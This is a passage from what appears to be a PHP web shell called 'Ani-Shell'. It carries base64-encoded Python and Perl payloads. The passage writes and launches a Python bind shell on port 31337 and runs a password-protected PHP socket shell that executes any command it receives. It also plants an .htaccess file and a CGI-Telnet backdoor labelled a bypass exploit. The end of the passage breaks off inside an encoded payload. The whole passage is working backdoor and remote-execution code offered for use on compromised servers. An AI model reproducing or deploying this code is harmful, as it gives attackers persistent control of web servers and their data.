            $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";
            $fd = fopen("bind.py","w");
            if($fd != FALSE)
            {
                fwrite($fd,base64_decode($Python_CODE));
                
                if($os == "Linux")
                {
                    echo "[+] OS Detected = Windows";
                    exec_all("chmod +x bind.py ; ./bind.py");
                    
                    // CHeck if the process is running
            
                    $pattern = "bind.py";
            
                    $list = exec_all("ps -aux");
                }
                else
                {
                    echo "[+] OS Detected = Windows";
                    exec_all("start bind.py");
                    // CHeck if the process is running
            
                    $pattern = "python.exe";
            
                    $list = exec_all("TASKLIST");
                }
                
                
                if(preg_match("/$pattern/",$list))
                {
                        echo "<p class='alert_green'>Process Found Running! Backdoor Setuped Successfully! :D</p>";
                }
                else
                {
                    echo "<p class='alert_red'>Process Not Found Running! Backdoor Setup FAILED :(</p>";
                }
                
                echo "<br /><br />\n<b>Task List :-</b> <pre>\n$list</pre>";
                
            }
        }
    }
    else if($_POST['mode'] == "PHP")
    {
            
        // Set time limit to indefinite execution
        set_time_limit (0);
        
        
        // Set the ip and port we will listen on
        
        if(function_exists("socket_create"))
        {
        // Create a TCP Stream socket
        $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
      
        // Bind the socket to an address/port
        
        
        if(socket_bind($sockfd, $address, $port) == FALSE)
        {
            echo "Cant Bind to the specified port and address!";
        }
        // Start listening for connections
        socket_listen($sockfd,15);
        
    
        $passwordPrompt = "\n=================================================================\nSecurity007 Webshell\n=================================================================\n\n0xPassword : ";
        
        /* Accept incoming requests and handle them as child processes */
        $client = socket_accept($sockfd);
        
        socket_write($client , $passwordPrompt);
        // Read the pass from the client
        $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n
        if(trim($input) == $pass)
        {
            socket_write($client , "\n\n");
            socket_write($client , ($os == "Windows") ? exec_all("date /t & time /t")  . "\n" . exec_all("ver") : exec_all("date") . "\n" . exec_all("uname -a"));
            socket_write($client , "\n\n");
            while(1)
            {
                // Print Command prompt
                $commandPrompt ="(Ani-Shell)[$]> ";
                $maxCmdLen = 31337;
                socket_write($client,$commandPrompt);
                $cmd = socket_read($client,$maxCmdLen);
                if($cmd == FALSE)
                {
                    echo "The client Closed the conection!";
                    break;
                }
                socket_write($client , exec_all($cmd));
            }
        }
        else
        {
            echo "Wrong Password!";
            socket_write($client, "sU(|< - 0FF Bitch!\n\n");
        }
        socket_shutdown($client, 2);
        socket_close($socket);
        
        // Close the client (child) socket
        //socket_close($client);
        // Close the master sockets
        //socket_close($sock);
        }
        else
        {
            echo "Socket Conections not Allowed/Supported by the server! <br />";
        }
    }
    else
    {
    ?>       
    <table class="bind" align="center" >
    <tr>
        <th class="header" colspan="1" width="50px">Back Connect</th>
        <th class="header" colspan="1" width="50px">Bind Shell</th>
    </tr>
    <tr>
        <form method='POST' >  
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>IP </td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="ip" value="<?php getClientIp();?>" />
                    </td>
                </tr>
                <tr>
                    <td>Port </td>
                    <td><input style="width: 100px;" class="cmd" name="port" size='5' value="31337"/></td>
                </tr>
                <tr>
                <td>Mode </td>    
                <td>
                        <select name="mode" class="cmd">
                            <option value="PHP">PHP</option>
                        </select>&nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Connect!"/></td>
                
            </table>
         </td>
         </form> 
         <form method="POST">
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="port" value="31337" />
                    </td>
                </tr>
                <tr>
                    <td>Passwd </td>
                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="security007"/>
                </tr>
                <tr>
                <td>
                Mode
                </td>
                <td>
                        <select name="mode" class="cmd">
                            <option value="PHP">PHP</option>
                            <option value="Python">Python</option>
                        </select> &nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Bind :D!"/></td>
                </tr>    
                   
            </table>
         </td>
         </form>
    </tr>
    </table>
    <p align="center" style="color: red;" >Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
<?php
    }
}
elseif(isset($_GET['cgi'])) {
	echo "<center/><br/><b><font color=blue>+--==[ cgitelnet.v1  Bypass Exploit]==--+ </font></b><br><br>";
 mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');      
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAiMTIzNDU2IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMDwvdGl0bGU+CiRIdG1sTWV0YUhlYWRlcgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0iI0MyQkZBNSIgYm9yZGVyY29sb3I9IiMwMDAwODAiIGFsaWduPSJjZW50ZXIiPgo8Yj48Zm9udCBjb2xvcj0iIzAwMDA4MCIgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjRkZGRkZGIj48Yj5DR0ktVGVsbmV0IFZlcnNpb24gMS4wIC0gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjQzJCRkE1Ij48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT4KPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjNjY5OTk5Ij4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8KLyAgX18gXHwgIF9fIFx8XyAgIF98ICAgICAgICB8XyAgIF98ICAgICAgfCB8ICAgICAgICAgICAgIHwgfAp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xwp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wKfCBcX18vXHwgfF9cIFwgX3wgfF8gICAgICAgICAgIHwgfCAgfCAgX18vfCB8fCB8IHwgfHwgIF9fL3wgfF8KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMAogICAgICAgICAgICAgICAgICAgICAg